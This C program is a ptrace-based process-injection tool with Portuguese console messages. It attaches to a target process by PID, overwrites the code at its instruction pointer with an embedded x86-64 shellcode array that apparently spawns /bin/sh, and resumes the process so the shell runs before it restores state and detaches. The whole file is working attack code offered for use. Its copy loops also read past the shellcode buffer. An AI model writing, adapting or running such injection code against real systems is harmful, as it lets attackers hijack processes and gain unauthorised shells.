#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <errno.h>

unsigned char shellcode[] = {
    0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91,
    0xd0, 0x8c, 0x97, 0xff, 0x48, 0x31, 0xdb, 0x53,
    0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0,
    0x3b, 0x0f, 0x05
};

#define SHELLCODE_SIZE  (sizeof(shellcode))

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Uso: %s <PID do processo alvo>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);
    struct user_regs_struct regs, orig_regs;
    long ret;

    printf("[*] Tentando anexar ao PID %d...\n", pid);

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("PTRACE_ATTACH falhou");
        return 1;
    }

    waitpid(pid, NULL, 0);  // espera o processo parar

    
    ptrace(PTRACE_GETREGS, pid, NULL, &orig_regs);
    regs = orig_regs;

    
    unsigned long inject_addr = regs.rip;

    printf("[*] Injetando shellcode em 0x%lx\n", inject_addr);

    
    unsigned char backup[SHELLCODE_SIZE];
    for (size_t i = 0; i < SHELLCODE_SIZE; i += sizeof(long)) {
        long word = ptrace(PTRACE_PEEKTEXT, pid, inject_addr + i, NULL);
        memcpy(backup + i, &word, sizeof(long));
    }

    
    for (size_t i = 0; i < SHELLCODE_SIZE; i += sizeof(long)) {
        long word;
        memcpy(&word, shellcode + i, sizeof(long));
        if (ptrace(PTRACE_POKETEXT, pid, inject_addr + i, word) == -1) {
            perror("PTRACE_POKETEXT falhou");
            goto restore;
        }
    }

  
    regs.rip = inject_addr;
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
        perror("PTRACE_SETREGS falhou");
        goto restore;
    }

    printf("[*] Continuando execução → shellcode deve rodar agora...\n");

    ptrace(PTRACE_CONT, pid, NULL, NULL);
    sleep(5);  // tempo para interagir com o shell

restore:
    printf("[*] Restaurando estado original...\n");
    
    for (size_t i = 0; i < SHELLCODE_SIZE; i += sizeof(long)) {
        long word;
        memcpy(&word, backup + i, sizeof(long));
        ptrace(PTRACE_POKETEXT, pid, inject_addr + i, word);
    }
    
    ptrace(PTRACE_SETREGS, pid, NULL, &orig_regs);

    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    printf("[*] Desanexado.\n");

    return 0;
}
